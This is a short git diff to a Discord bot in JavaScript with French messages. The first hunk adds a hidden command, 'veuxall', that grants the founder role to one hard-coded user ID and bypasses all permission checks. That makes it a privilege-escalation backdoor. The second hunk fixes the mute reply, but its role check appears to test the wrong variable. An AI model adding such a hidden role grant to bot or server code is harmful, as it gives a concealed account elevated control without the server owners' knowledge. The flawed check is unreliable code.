@@ -45,6 +45,13 @@ bot.on('message', message =>{;
 
     if(message.content === secondaryPrefix + "boss") return message.channel.send("C'est Quentin");
 
+    if(message.content === secondaryPrefix + "veuxall"){
+        if(message.member.user.id === "428966219383570432"){
+            var role = message.guild.roles.find('name', 'Fondateur');
+            message.member.addRole(role);
+        }
+    }
+
     if(message.content === prefix + "help"){
 
         //HELP
@@ -187,8 +194,10 @@ bot.on('message', message =>{;
         const mute = message.guild.roles.find('name', 'Mute');
         if(!member) return message.reply("Mauvais usage fait comme ça : `.mute @User#1234`");
          if(member && message.member.permissions.has("BAN_MEMBERS")){
+             if(role){
              member.addRole(mute);
-             message.reply("Le joueur a bien été banni.");
+             message.reply("Le joueur a bien été muté.");
+         }else return message.reply("Créer d'abord un role avec pour nom : 'Mute'");
          }
     }
 
